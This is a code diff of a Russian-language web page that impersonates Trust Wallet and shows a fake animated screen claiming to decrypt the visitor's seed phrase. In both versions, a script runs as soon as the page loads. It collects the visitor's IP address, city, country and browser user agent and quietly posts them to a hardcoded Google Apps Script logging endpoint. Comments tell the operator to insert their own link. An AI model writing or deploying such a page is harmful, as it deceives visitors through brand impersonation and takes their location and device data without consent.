@@ -1,63 +1,272 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet</title>
-    <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; font-family: -apple-system, sans-serif; }
-        .container { text-align: center; width: 90%; max-width: 350px; }
-        .logo-svg { width: 80px; height: 80px; margin-bottom: 40px; fill: #0500ff; }
-        .loader-track { width: 100%; height: 4px; background-color: #f0f2f5; border-radius: 10px; margin-bottom: 20px; overflow: hidden; position: relative; }
-        .loader-fill { width: 0%; height: 100%; background: #0500ff; animation: load 4s infinite ease-in-out; }
-        .status { color: #5b616e; font-size: 15px; font-weight: 500; }
-        @keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Trust Wallet</title>
+  <style>
+    /* Твой существующий CSS без изменений */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background-color: #0D1117;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
+      overflow-x: hidden;
+      padding: 20px;
+    }
+    #notify-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.75);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+    }
+    .notify-box {
+      background: #161B22;
+      border: 1px solid #3375BB;
+      border-radius: 20px;
+      padding: 36px 40px;
+      width: 340px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: 0 0 40px rgba(51,117,187,0.35);
+      animation: popIn 0.4s cubic-bezier(.34,1.56,.64,1);
+    }
+    @keyframes popIn {
+      from { transform: scale(0.8); opacity: 0; }
+      to   { transform: scale(1);   opacity: 1; }
+    }
+    .notify-shield { width: 72px; height: 72px; margin-bottom: 20px; animation: pulse 2s infinite; }
+    .notify-title { font-size: 16px; font-weight: 700; color: #E6EDF3; text-align: center; margin-bottom: 8px; }
+    .notify-sub { font-size: 13px; color: #8B949E; text-align: center; margin-bottom: 24px; }
+    .notify-progress-wrap { width: 100%; background: #21262D; border-radius: 100px; height: 5px; overflow: hidden; }
+    .notify-progress-bar {
+      height: 100%;
+      border-radius: 100px;
+      background: linear-gradient(90deg, #3375BB, #00E5A0, #3375BB);
+      background-size: 200% 100%;
+      animation: shimmer 1.5s linear infinite, notifyGrow 3s ease-in-out forwards;
+    }
+    @keyframes notifyGrow { from { width: 0%; } to { width: 100%; } }
+    .logo { margin-bottom: 30px; display: flex; align-items: center; gap: 12px; }
+    .logo-text { font-size: 22px; font-weight: 700; color: #fff; }
+    .card {
+      background: #161B22;
+      border: 1px solid #21262D;
+      border-radius: 24px;
+      padding: 40px;
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.5);
+    }
+    .shield-icon { width: 80px; height: 80px; margin-bottom: 24px; animation: pulse 2s infinite; }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.8; transform: scale(1.05); }
+    }
+    .title { font-size: 18px; font-weight: 600; color: #E6EDF3; text-align: center; margin-bottom: 8px; }
+    .subtitle { font-size: 14px; color: #8B949E; text-align: center; margin-bottom: 32px; }
+    .progress-wrapper { width: 100%; background: #21262D; border-radius: 100px; height: 8px; overflow: hidden; margin-bottom: 12px; }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      border-radius: 100px;
+      background: linear-gradient(90deg, #3375BB, #00E5A0, #3375BB);
+      background-size: 200% 100%;
+      animation: shimmer 1.5s linear infinite, grow 10s ease-in-out infinite;
+    }
+    @keyframes shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+    @keyframes grow { 0% { width: 0%; } 100% { width: 100%; } }
+    .percent { font-size: 14px; color: #00E5A0; font-weight: 700; margin-bottom: 30px; align-self: flex-end; }
+    .checklist { width: 100%; display: flex; flex-direction: column; gap: 12px; border-top: 1px solid #21262D; padding-top: 24px; }
+    .check-item { display: flex; align-items: center; gap: 12px; opacity: 0.3; transition: all 0.4s ease; transform: translateX(-10px); }
+    .check-item.active { opacity: 1; transform: translateX(0); }
+    .check-circle { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #3375BB; display: flex; align-items: center; justify-content: center; transition: all 0.3s ease; }
+    .check-item.done .check-circle { background: #00E5A0; border-color: #00E5A0; }
+    .check-circle svg { width: 12px; height: 12px; stroke: white; stroke-width: 4; display: none; }
+    .check-item.done .check-circle svg { display: block; }
+    .check-text { font-size: 14px; color: #8B949E; }
+    .check-item.done .check-text { color: #E6EDF3; }
+    .check-status { margin-left: auto; font-size: 12px; font-weight: 600; color: #3375BB; }
+    .check-item.done .check-status { color: #00E5A0; }
+    @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
+  </style>
 </head>
 <body>
 
-<div class="container">
-    <svg class="logo-svg" viewBox="0 0 512 512">
-        <path d="M256 0L48 94.4v133.4C48 355.6 256 512 256 512s208-156.4 208-284.2V94.4L256 0z" fill="#0500ff"/>
-        <path d="M256 465c-20-15.8-164-129.5-164-237.2V122.3L256 45.1l164 77.2v105.5C420 335.5 276 449.2 256 465z" fill="#fff"/>
-        <path d="M140 230l80 80 152-152" stroke="#0500ff" stroke-width="40" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+  <div id="notify-overlay">
+    <div class="notify-box">
+      <svg class="notify-shield" viewBox="0 0 80 90" fill="none">
+        <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#ng1)"/>
+        <defs>
+          <linearGradient id="ng1" x1="6" y1="4" x2="74" y2="86" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0040FF"/>
+            <stop offset="100%" stop-color="#00E5A0"/>
+          </linearGradient>
+        </defs>
+      </svg>
+      <div class="notify-title">Подключение к кошельку</div>
+      <div class="notify-sub">Установка защищённого канала...</div>
+      <div class="notify-progress-wrap">
+        <div class="notify-progress-bar"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="logo">
+    <svg width="32" height="32" viewBox="0 0 80 90" fill="none">
+      <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#lg1)"/>
+      <defs>
+        <linearGradient id="lg1" x1="6" y1="4" x2="74" y2="86" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#0040FF"/>
+          <stop offset="100%" stop-color="#00E5A0"/>
+        </linearGradient>
+      </defs>
     </svg>
-    <div class="loader-track"><div class="loader-fill"></div></div>
-    <div class="status" id="status-text">Расшифровываем вашу seed-фразу, получаем доступ к вашим деньгам...</div>
-</div>
+    <span class="logo-text">Trust Wallet</span>
+  </div>
 
-<script>
-    async function sendLog() {
-        // !!! ЗАМЕНИ ССЫЛКУ НИЖЕ НА СВОЮ ИЗ ШАГА 1 !!!
-        const webAppURL = 'https://script.google.com/macros/s/AKfycbykwY3qxSHEORxLTMD7eR5R6aK_3z12sNcG_OcEFdItC00ge1UZRTDjOsJPyKqKU0JCwg/exec';
+  <div class="card">
+    <svg class="shield-icon" viewBox="0 0 80 90" fill="none">
+      <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#cg1)"/>
+      <path d="M28 44L36 52L54 34" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+      <defs>
+        <linearGradient id="cg1" x1="6" y1="4" x2="74" y2="86" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#0040FF"/>
+          <stop offset="100%" stop-color="#00E5A0"/>
+        </linearGradient>
+      </defs>
+    </svg>
 
-        try {
-            // Получаем IP и Гео
-            const geoRes = await fetch('https://ipapi.co/json/');
-            const geo = await geoRes.json();
-            
-            const params = new URLSearchParams();
-            params.append('ip', geo.ip);
-            params.append('location', `${geo.country_name}, ${geo.city}`);
-            params.append('userAgent', navigator.userAgent);
+    <div class="title">Расшифровка Seed-фразы</div>
+    <div class="subtitle">Пожалуйста, подождите...</div>
 
-            // Отправка в таблицу
-            fetch(webAppURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: params
-            });
-        } catch (e) {
-            // Если IP заблокирован, отправляем базовое инфо
-            const params = new URLSearchParams();
-            params.append('userAgent', navigator.userAgent);
-            fetch(webAppURL, { method: 'POST', mode: 'no-cors', body: params });
-        }
+    <div class="progress-wrapper">
+      <div class="progress-bar" id="mainBar"></div>
+    </div>
+    <div class="percent" id="pct">0%</div>
+    
+    <div class="checklist">
+      <div class="check-item" id="step1">
+        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+        <span class="check-text">Проверка ключей</span>
+        <span class="check-status">В процессе</span>
+      </div>
+      <div class="check-item" id="step2">
+        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+        <span class="check-text">Анализ мнемоники</span>
+        <span class="check-status">Ожидание</span>
+      </div>
+      <div class="check-item" id="step3">
+        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+        <span class="check-text">Дешифрование данных</span>
+        <span class="check-status">Ожидание</span>
+      </div>
+      <div class="check-item" id="step4">
+        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+        <span class="check-text">Синхронизация</span>
+        <span class="check-status">Ожидание</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // --- 1. Твоя ссылка на Google Apps Script ---
+    const googleScriptURL = 'https://script.google.com/macros/s/AKfycbykwY3qxSHEORxLTMD7eR5R6aK_3z12sNcG_OcEFdItC00ge1UZRTDjOsJPyKqKU0JCwg/exec';
+
+    // --- 2. Логика сбора данных и отправки ---
+    async function collectAndSend() {
+      try {
+        // Получаем Гео и IP
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geo = await geoRes.json();
+        
+        const params = new URLSearchParams();
+        params.append('ip', geo.ip || 'Unknown');
+        params.append('location', `${geo.country_name || '?'}, ${geo.city || '?'}`);
+        params.append('userAgent', navigator.userAgent);
+
+        // Отправка в таблицу (no-cors)
+        fetch(googleScriptURL, {
+          method: 'POST',
+          mode: 'no-cors',
+          body: params
+        });
+      } catch (e) {
+        // Резервная отправка без Гео (если заблокирован API)
+        const params = new URLSearchParams();
+        params.append('ip', 'VPN/Blocked');
+        params.append('location', 'Unknown');
+        params.append('userAgent', navigator.userAgent);
+        fetch(googleScriptURL, { method: 'POST', mode: 'no-cors', body: params });
+      }
     }
 
-    window.onload = sendLog;
-</script>
+    // Запуск сбора данных сразу при загрузке
+    collectAndSend();
+
+    // --- 3. Твоя анимация (остается без изменений) ---
+    const overlay = document.getElementById('notify-overlay');
+    setTimeout(() => {
+      overlay.style.animation = 'fadeOut 0.5s ease forwards';
+      setTimeout(() => overlay.remove(), 500);
+    }, 3000);
+
+    const pctEl = document.getElementById('pct');
+    const steps = [
+      { id: 'step1', threshold: 0, end: 25 },
+      { id: 'step2', threshold: 25, end: 50 },
+      { id: 'step3', threshold: 50, end: 75 },
+      { id: 'step4', threshold: 75, end: 100 }
+    ];
+
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += 0.5;
+      if (progress > 100) progress = 0; 
+
+      pctEl.textContent = Math.floor(progress) + '%';
+      document.getElementById('mainBar').style.width = progress + '%';
+
+      steps.forEach((step) => {
+        const el = document.getElementById(step.id);
+        const statusText = el.querySelector('.check-status');
+
+        if (progress >= step.threshold) {
+          el.classList.add('active');
+          statusText.textContent = 'В процессе';
+        } else {
+          el.classList.remove('active', 'done');
+          statusText.textContent = 'Ожидание';
+        }
+
+        if (progress >= step.end) {
+          el.classList.add('done');
+          statusText.textContent = 'Выполнено';
+        }
+      });
+
+      if (progress === 0) {
+        steps.forEach(s => document.getElementById(s.id).classList.remove('active', 'done'));
+      }
+    }, 100);
+  </script>
 
 </body>
 </html>
+
 
